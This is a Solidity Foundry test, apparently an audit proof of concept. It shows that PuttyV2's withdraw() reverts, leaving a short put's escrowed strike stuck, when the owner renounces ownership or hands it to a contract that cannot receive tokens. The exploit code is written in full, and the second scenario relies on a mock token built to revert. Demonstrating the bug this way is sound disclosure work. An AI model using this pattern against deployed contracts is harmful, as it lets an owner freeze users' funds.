// SPDX-License-Identifier: MIT
pragma solidity 0.8.13;

/*
    Foundry PoC for PuttyV2 strike–withdrawal griefing bug.

    Scenario reproduced:
    1.  Maker creates a SHORT PUT order (strike is escrowed inside PuttyV2).
    2.  Deployer (owner) griefs by either
        a) renouncing ownership, setting owner() = address(0); or
        b) transferring ownership to a contract that causes token transfers to revert.
    3.  When the short side attempts to withdraw after option expiry,
        PuttyV2 tries to skim the fee to owner() *before* returning the strike.
        The fee-transfer reverts => entire withdraw() reverts => funds permanently stuck.
*/

import "forge-std/Test.sol";
import "openzeppelin/token/ERC20/ERC20.sol";
import "src/PuttyV2.sol";

contract MockStrikeToken is ERC20 {
    // any transfer to this address reverts (used for method #2)
    address public immutable revertTarget;

    constructor(string memory name_, string memory symbol_, address _revertTarget)
        ERC20(name_, symbol_)
    {
        revertTarget = _revertTarget;
        _mint(msg.sender, 1_000_000 ether);
    }

    // override to introduce revert when needed
    function _transfer(address from, address to, uint256 amount) internal override {
        require(to != address(0), "ERC20: transfer to the zero address"); // method #1
        if (to == revertTarget) revert("ERC20: transfer to revert target"); // method #2
        super._transfer(from, to, amount);
    }
}

// Recipient that rejects any ERC777 tokens (used as new owner() for method #2)
contract MaliciousRecipient {
    // ERC777 hook
    function tokensReceived(
        address,
        address,
        address,
        uint256,
        bytes calldata,
        bytes calldata
    ) external pure {
        revert("no tokens accepted");
    }
}

contract ExploitTest is Test {
    /* -------------------------------------------------------------------------- */
    /*                              GLOBAL TEST STATE                             */
    /* -------------------------------------------------------------------------- */
    uint256 private constant MAKER_PK   = 0xA11CE;
    uint256 private constant TAKER_PK   = 0xB0B;
    address private maker               = vm.addr(MAKER_PK); // short position owner
    address private taker               = vm.addr(TAKER_PK); // long position owner
    address private deployer            = address(this);     // test contract acts as deployer

    PuttyV2               private putty;
    MockStrikeToken       private strike;
    MockStrikeToken       private strike2;
    MaliciousRecipient    private maliciousOwner;

    /* -------------------------------------------------------------------------- */
    /*                                   SETUP                                    */
    /* -------------------------------------------------------------------------- */
    function setUp() public {
        /* ---------- Instance for Method #1 : owner() = address(0) ---------- */
        strike = new MockStrikeToken("StrikeToken", "STK", address(0));
        putty  = new PuttyV2("uri/", 10 /* 1% fee */, address(strike)); // weth irrelevant

        // fund & approve maker
        strike.transfer(maker, 1_000 ether);
        vm.prank(maker);
        strike.approve(address(putty), type(uint256).max);

        /* ---------- Instance for Method #2 : owner() reverts on receive ---------- */
        maliciousOwner = new MaliciousRecipient();
        strike2        = new MockStrikeToken("StrikeToken2", "STK2", address(maliciousOwner));
    }

    /* -------------------------------------------------------------------------- */
    /*                           INTERNAL HELPER LOGIC                            */
    /* -------------------------------------------------------------------------- */
    function _createOrder(address _baseAsset) internal view returns (PuttyV2.Order memory order) {
        order.maker       = maker;
        order.isCall      = false;            // PUT
        order.isLong      = false;            // SHORT (maker is short)
        order.baseAsset   = _baseAsset;
        order.strike      = 100 ether;        // ensures feeAmount > 0
        order.premium     = 0;                // zero premium for simplicity
        order.duration    = 1 days;
        order.expiration  = block.timestamp + 2 days;
        order.nonce       = 0;

        order.whitelist   = new address[](0);
        order.floorTokens = new address[](0);
        order.erc20Assets = new PuttyV2.ERC20Asset[](0);
        order.erc721Assets= new PuttyV2.ERC721Asset[](0);
    }

    function _fillShortPut(
        PuttyV2 instance,
        PuttyV2.Order memory order,
        bytes memory signature
    ) internal returns (uint256 positionId) {
        vm.prank(taker); // taker fills the order
        uint256[] memory emptyIds = new uint256[](0);
        positionId = instance.fillOrder(order, signature, emptyIds);
    }

    /* -------------------------------------------------------------------------- */
    /*                         TEST: owner() == address(0)                        */
    /* -------------------------------------------------------------------------- */
    function testWithdrawReverts_WhenOwnerZeroAddress() public {
        // 1. build & sign SHORT PUT order (maker = `maker`)
        PuttyV2.Order memory order = _createOrder(address(strike));
        bytes32 orderHash = putty.hashOrder(order);
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(MAKER_PK, orderHash);
        bytes memory sig = abi.encodePacked(r, s, v);

        // 2. fill order ⇒ strike tokens escrowed in PuttyV2
        _fillShortPut(putty, order, sig);

        // 3. advance time past expiry so short can withdraw
        vm.warp(block.timestamp + order.duration + 1);

        // 4. grief: owner renounces ownership (owner() → address(0))
        putty.renounceOwnership();
        assertEq(putty.owner(), address(0), "owner should be zero address");

        // 5. maker tries to withdraw – should revert because fee sent to zero address
        vm.expectRevert(bytes("ERC20: transfer to the zero address"));
        vm.prank(maker);
        putty.withdraw(order);
    }

    /* -------------------------------------------------------------------------- */
    /*                 TEST: owner() is contract that forces revert               */
    /* -------------------------------------------------------------------------- */
    function testWithdrawReverts_WhenOwnerContractRevertsOnReceive() public {
        // deploy fresh PuttyV2 owned by `deployer`
        PuttyV2 putty2 = new PuttyV2("uri/", 10, address(strike2));

        // transfer ownership to malicious contract
        putty2.transferOwnership(address(maliciousOwner));
        assertEq(putty2.owner(), address(maliciousOwner), "owner should be malicious contract");

        // fund & approve maker for this strike token
        strike2.transfer(maker, 1_000 ether);
        vm.prank(maker);
        strike2.approve(address(putty2), type(uint256).max);

        // build & sign order
        PuttyV2.Order memory order = _createOrder(address(strike2));
        bytes32 orderHash = putty2.hashOrder(order);
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(MAKER_PK, orderHash);
        bytes memory sig = abi.encodePacked(r, s, v);

        // fill order
        _fillShortPut(putty2, order, sig);

        // expire option
        vm.warp(block.timestamp + order.duration + 1);

        // withdraw should revert because strike transfer to maliciousOwner reverts inside token
        vm.expectRevert(bytes("ERC20: transfer to revert target"));
        vm.prank(maker);
        putty2.withdraw(order);
    }
}